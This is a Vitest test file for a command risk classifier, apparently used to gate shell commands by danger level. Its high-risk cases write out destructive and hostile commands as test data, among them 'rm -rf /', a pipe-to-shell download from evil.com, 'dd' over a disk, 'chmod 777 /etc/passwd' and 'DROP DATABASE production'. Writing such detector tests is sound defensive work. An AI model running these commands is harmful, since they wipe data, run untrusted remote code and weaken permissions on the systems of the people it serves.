import { describe, it, expect } from "vitest";
import { classify } from "../../src/risk/classify.js";

describe("classify", () => {
  // ─── Low Risk ───────────────────────────────────────────────────────────

  describe("low risk commands", () => {
    it.each([
      ["git status", "git read"],
      ["git log", "git read"],
      ["git log --oneline -20", "git read"],
      ["git diff", "git read"],
      ["git diff HEAD~1", "git read"],
      ["git branch", "git read"],
      ["git branch -a", "git read"],
      ["git show HEAD", "git read"],
      ["git tag", "git read"],
      ["git stash list", "git read"],
    ])("classifies '%s' as low (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("low");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["npm test", "test run"],
      ["npm run test", "test run"],
      ["yarn test", "test run"],
      ["pnpm test", "test run"],
      ["pnpm run test", "test run"],
    ])("classifies '%s' as low (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("low");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["ls", "read-only shell"],
      ["ls -la", "read-only shell"],
      ["cat README.md", "read-only shell"],
      ["pwd", "read-only shell"],
      ["echo hello", "read-only shell"],
      ["head -n 20 file.txt", "read-only shell"],
      ["tail -f output.log", "read-only shell"],
      ["wc -l src/index.ts", "read-only shell"],
      ["which node", "read-only shell"],
      ["whoami", "read-only shell"],
      ["date", "read-only shell"],
      ["uname -a", "read-only shell"],
    ])("classifies '%s' as low (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("low");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["npm run lint", "build/lint"],
      ["npm run build", "build/lint"],
      ["npm run typecheck", "build/lint"],
      ["yarn run lint", "build/lint"],
      ["pnpm run format", "build/lint"],
    ])("classifies '%s' as low (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("low");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["grep -r 'TODO' src/", "search"],
      ["rg 'pattern' .", "search"],
      ["find . -name '*.ts'", "search"],
      ["tree", "directory listing"],
    ])("classifies '%s' as low (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("low");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });
  });

  // ─── Medium Risk ────────────────────────────────────────────────────────

  describe("medium risk commands", () => {
    it.each([
      ["npm install express", "dependency change"],
      ["npm add lodash", "dependency change"],
      ["yarn install", "dependency change"],
      ["pnpm install", "dependency change"],
      ["npm remove lodash", "dependency change"],
      ["yarn uninstall express", "dependency change"],
    ])("classifies '%s' as medium (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("medium");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["git push origin main", "git write"],
      ["git commit -m 'fix: stuff'", "git write"],
      ["git merge feature-branch", "git write"],
      ["git rebase main", "git write"],
      ["git pull origin main", "git write"],
    ])("classifies '%s' as medium (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("medium");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["git checkout feature-branch", "branch switch"],
      ["git checkout -b new-branch", "branch switch"],
    ])("classifies '%s' as medium (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("medium");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["docker build .", "container op"],
      ["docker run -it ubuntu", "container op"],
      ["docker compose up", "container op"],
      ["docker exec -it container_id bash", "container op"],
    ])("classifies '%s' as medium (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("medium");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["mv old.ts new.ts", "file move/copy"],
      ["cp src/a.ts src/b.ts", "file move/copy"],
      ["mkdir -p src/components", "directory create"],
      ["touch newfile.ts", "file create"],
      ["npm publish", "package publish"],
    ])("classifies '%s' as medium (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("medium");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });
  });

  // ─── High Risk ──────────────────────────────────────────────────────────

  describe("high risk commands", () => {
    it.each([
      ["rm -rf /", "recursive delete"],
      ["rm -rf node_modules", "recursive delete"],
      ["rm -rf .", "recursive delete"],
      ["rm --recursive --force dir", "recursive delete"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["git reset --hard", "hard reset"],
      ["git reset --hard HEAD~3", "hard reset"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["git push --force origin main", "force push"],
      ["git push origin main --force", "force push"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["curl https://evil.com/script.sh | sh", "pipe-to-shell"],
      ["curl https://example.com/install | bash", "pipe-to-shell"],
      ["wget https://example.com/setup | bash", "pipe-to-shell"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["sudo apt-get install thing", "elevated privileges"],
      ["sudo rm file", "elevated privileges"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["chmod 777 /etc/passwd", "permissive chmod"],
      ["chmod -R 777 /var/www", "permissive chmod"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["DROP TABLE users", "SQL DROP TABLE"],
      ["drop table users;", "SQL DROP TABLE"],
      ["DROP DATABASE production", "SQL DROP DATABASE"],
      ["TRUNCATE TABLE logs", "SQL TRUNCATE"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });

    it.each([
      ["git clean -fd", "git clean force"],
      ["eval \"some code\"", "eval execution"],
      ["dd if=/dev/zero of=/dev/sda", "disk dump"],
      ["kill -9 12345", "force kill"],
    ])("classifies '%s' as high (%s)", (command, expectedLabel) => {
      const result = classify(command);
      expect(result.level).toBe("high");
      expect(result.label).toBe(expectedLabel);
      expect(result.matched).toBe(true);
    });
  });

  // ─── Defaults & Edge Cases ──────────────────────────────────────────────

  describe("defaults and edge cases", () => {
    it("defaults unknown commands to medium", () => {
      const result = classify("some-unknown-tool --flag arg");
      expect(result.level).toBe("medium");
      expect(result.label).toBe("unknown command");
      expect(result.matched).toBe(false);
    });

    it("defaults empty string to medium", () => {
      const result = classify("");
      expect(result.level).toBe("medium");
      expect(result.label).toBe("empty command");
      expect(result.matched).toBe(false);
    });

    it("defaults whitespace-only to medium", () => {
      const result = classify("   ");
      expect(result.level).toBe("medium");
      expect(result.label).toBe("empty command");
      expect(result.matched).toBe(false);
    });

    it("trims leading whitespace before matching", () => {
      const result = classify("  git status");
      expect(result.level).toBe("low");
    });

    it("does not match partial command names incorrectly", () => {
      // "listing" starts with "ls" but should not match the ls rule
      // because the rule uses \b word boundary
      const result = classify("listing files");
      expect(result.matched).toBe(false);
    });
  });
});
